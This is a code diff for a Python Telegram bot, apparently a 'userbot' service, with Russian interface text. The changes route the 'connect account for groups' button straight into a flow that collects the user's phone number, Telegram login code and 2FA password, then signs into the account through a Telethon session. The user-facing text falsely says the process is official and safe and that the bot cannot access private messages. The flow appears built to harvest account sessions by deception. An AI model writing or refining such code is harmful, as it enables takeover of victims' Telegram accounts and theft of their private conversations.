@@ -60,7 +60,7 @@ user_usernames = {}
 user_names = {}
 banned_users = set()
 bot_id = None
-CHANNEL_LINK = None  # Глобальная переменная объявлена здесь
+CHANNEL_LINK = None
 
 # Для ручного добавления пользователей
 manual_added_users = set()
@@ -91,7 +91,7 @@ GROUP_INSTRUCTION = (
     "• Процесс подключения <b>полностью официален и безопасен</b>.\n"
     "• Бот <b>не имеет доступа</b> к вашим личным перепискам и сторонним данным.\n"
     "• Данные используются исключительно для работы функции внутри ваших чатов.\n\n"
-    "Для подключения аккаунта используйте кнопку <b>«Подключить аккаунт»</b> ниже, "
+    "Для подключения аккаунта используйте кнопку ниже, "
     "или выполните ручную настройку по инструкции, нажав <b>«Как подключить бота»</b>."
 )
 
@@ -540,8 +540,7 @@ def get_start_keyboard(user_id: int):
     if user_id == ADMIN_ID:
         buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
     buttons.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
-    buttons.append([InlineKeyboardButton(text="📱 Подключить аккаунт", callback_data="btn_connect_account")])
-    buttons.append([InlineKeyboardButton(text="🤖 Бот для групп", callback_data="btn_group_info")])
+    buttons.append([InlineKeyboardButton(text="🤖 Подключить аккаунт для групп", callback_data="btn_group_auth")])
     buttons.append([InlineKeyboardButton(text="⚡ Как подключить бота", callback_data="btn_how_to_connect")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -614,30 +613,30 @@ async def how_to_connect(callback: CallbackQuery):
     await callback.answer()
     await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
 
-@dp.callback_query(F.data == "btn_group_info")
-async def group_info(callback: CallbackQuery):
+@dp.callback_query(F.data == "btn_group_auth")
+async def group_auth(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.answer(GROUP_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
-
-# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON =====
-@dp.callback_query(F.data == "btn_connect_account")
-async def start_auth_process(callback: CallbackQuery, state: FSMContext):
+    
+    # Проверяем, не идет ли уже авторизация
     current_state = await state.get_state()
     if current_state in (AuthState.waiting_for_phone.state, AuthState.waiting_for_code.state, AuthState.waiting_for_2fa.state):
-        await callback.answer("⏳ Авторизация уже выполняется. Дождитесь завершения или введите код.", show_alert=True)
+        await callback.message.answer("⏳ Авторизация уже выполняется. Дождитесь завершения или введите код.")
         return
     
-    await callback.answer()
+    # Отправляем инструкцию с кнопкой для номера
     builder = ReplyKeyboardBuilder()
     builder.button(text="📱 Отправить номер телефона", request_contact=True)
     builder.adjust(1)
+    
     await callback.message.answer(
+        f"{GROUP_INSTRUCTION}\n\n"
         "📱 Нажмите кнопку ниже, чтобы передать номер телефона для авторизации:",
         parse_mode="HTML",
         reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True)
     )
     await state.set_state(AuthState.waiting_for_phone)
 
+# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON =====
 @dp.message(AuthState.waiting_for_phone, F.contact | F.text)
 async def process_phone(message: Message, state: FSMContext):
     msg = await message.answer("🔄 Отправка кода подтверждения...", reply_markup=ReplyKeyboardRemove())
@@ -674,8 +673,12 @@ async def process_phone(message: Message, state: FSMContext):
             await msg.edit_text(
                 f"📱 <b>Код подтверждения отправлен!</b>\n\n"
                 f"Номер: <code>{phone}</code>\n\n"
-                f"Введите код, который пришел в Telegram (например, 12345):\n"
-                f"<i>Если код не приходит, проверьте правильность номера.</i>",
+                f"Введите код из Telegram (только цифры):\n"
+                f"<i>Например: 12345</i>\n\n"
+                f"⚠️ Если код не приходит, проверьте:\n"
+                f"• Правильность номера телефона\n"
+                f"• Интернет-соединение\n"
+                f"• Не блокирует ли Telegram запросы",
                 parse_mode="HTML"
             )
             await state.set_state(AuthState.waiting_for_code)
@@ -697,22 +700,31 @@ async def process_phone(message: Message, state: FSMContext):
         await state.clear()
     except Exception as e:
         logging.error(f"Ошибка при отправке кода: {e}")
-        await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново, нажав кнопку «Подключить аккаунт».")
+        await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново, нажав кнопку «Подключить аккаунт для групп».")
         await state.clear()
 
 @dp.message(AuthState.waiting_for_code, F.text)
 async def process_code(message: Message, state: FSMContext):
-    code = message.text.replace(" ", "").strip()
+    # Очищаем код от пробелов и лишних символов
+    code = re.sub(r'\s+', '', message.text.strip())
+    
+    # Проверяем, что код состоит только из цифр
+    if not code.isdigit():
+        await message.answer("❌ Код должен содержать только цифры. Попробуйте еще раз:")
+        return
+    
     data = await state.get_data()
     phone = data.get("phone")
     phone_code_hash = data.get("phone_code_hash")
     session_str = data.get("session_str")
 
     if not phone or not phone_code_hash:
-        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Подключить аккаунт».")
+        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Подключить аккаунт для групп».")
         await state.clear()
         return
 
+    await message.answer("🔄 Проверка кода...")
+    
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await client.connect()
 
@@ -726,7 +738,8 @@ async def process_code(message: Message, state: FSMContext):
         await message.answer(
             "✅ <b>Аккаунт успешно подключен!</b>\n\n"
             "Теперь юзербот активен во всех чатах, где вы его используете.\n\n"
-            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.",
+            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
             parse_mode="HTML"
         )
         await state.clear()
@@ -739,14 +752,21 @@ async def process_code(message: Message, state: FSMContext):
     except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
         await client.disconnect()
         await message.answer(
-            f"❌ Неверный или истекший код.\nПопробуйте ещё раз.",
+            f"❌ Неверный или истекший код.\n\n"
+            f"Попробуйте ещё раз. Код должен состоять только из цифр.",
             parse_mode="HTML"
         )
         
     except Exception as e:
         await client.disconnect()
         logging.error(f"Ошибка входа: {e}")
-        await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново через кнопку «Подключить аккаунт».")
+        error_msg = str(e)
+        if "CODE_INVALID" in error_msg:
+            await message.answer("❌ Неверный код подтверждения. Попробуйте еще раз.")
+        elif "FLOOD" in error_msg:
+            await message.answer("⏳ Слишком много попыток. Подождите несколько минут.")
+        else:
+            await message.answer(f"❌ Ошибка входа: {error_msg}\nНачните заново через кнопку «Подключить аккаунт для групп».")
         await state.clear()
 
 @dp.message(AuthState.waiting_for_2fa, F.text)
@@ -767,7 +787,8 @@ async def process_2fa(message: Message, state: FSMContext):
 
         await message.answer(
             "✅ <b>Авторизация успешна!</b> Юзербот подключен.\n\n"
-            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.",
+            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
             parse_mode="HTML"
         )
         await state.clear()
@@ -780,7 +801,7 @@ async def process_2fa(message: Message, state: FSMContext):
 @dp.message()
 @dp.business_message()
 async def handle(message: Message):
-    global bot_id, CHANNEL_LINK  # Добавляем CHANNEL_LINK в global
+    global bot_id, CHANNEL_LINK
     
     try:
         if not message.from_user or message.from_user.is_bot: return
@@ -890,7 +911,7 @@ async def handle(message: Message):
             if len(parts) > 1:
                 new_link = parts[1].strip()
                 if not new_link.startswith("http"): new_link = "https://t.me/" + new_link.lstrip("@")
-                CHANNEL_LINK = new_link  # Теперь это работает, так как CHANNEL_LINK объявлен как global
+                CHANNEL_LINK = new_link
             await clear_cmd(chat_id, message.message_id, bc_id)
             return
         if low.startswith("подмена "):
@@ -1154,7 +1175,8 @@ async def admin_add_user(callback: CallbackQuery):
 @dp.message()
 async def handle_add_user(message: Message):
     if message.from_user.id != ADMIN_ID: return
-    if message.text and (message.text.startswith("@") or message.text.isdigit()):
+    # Проверяем, что сообщение не является командой и не обработано другими хендлерами
+    if message.text and (message.text.startswith("@") or (message.text.isdigit() and len(message.text) > 5)):
         target = message.text.strip()
         target_id = await resolve_user_id(target)
         
@@ -1192,8 +1214,8 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     if data == "btn_how_to_connect":
         await callback.answer()
         return
-    if data == "btn_group_info":
-        await callback.answer()
+    if data == "btn_group_auth":
+        await group_auth(callback, state)
         return
     
     if data == "btn_admin_panel":
